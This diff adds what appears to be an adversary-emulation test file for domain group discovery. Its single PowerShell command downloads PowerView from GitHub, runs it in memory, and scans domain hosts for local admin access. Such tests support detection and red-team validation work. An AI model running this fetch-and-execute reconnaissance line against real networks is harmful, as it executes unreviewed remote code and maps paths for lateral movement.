@@ -1,0 +1,8 @@
+#TechniqueName: Permission Groups Discovery: Domain Groups
+#AtomicTestName: Find machines where user has local admin access (PowerView)
+#Description: Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.&
+#Language: ps1
+
+#commands
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-LocalAdminAccess -Verbose
+
